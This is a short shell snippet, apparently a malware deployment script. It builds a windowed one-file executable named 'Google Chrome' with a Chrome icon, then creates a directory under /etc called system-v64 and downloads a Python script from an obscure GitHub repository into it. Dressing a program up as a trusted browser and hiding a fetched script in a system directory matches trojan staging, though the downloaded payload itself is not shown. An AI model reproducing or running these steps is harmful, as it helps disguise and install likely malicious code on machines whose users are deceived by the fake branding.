...
pyinstaller --noconfirm --onefile --windowed --icon "Google-Chrome-Logo-1536x1536-3017027129.ico" --name "Google Chrome" 
cd /etc
mkdir system-v64
cd /etc/system-v64
wget https://raw.githubusercontent.com/mdn-gay/1239277489294m/refs/heads/main/system-v64.py
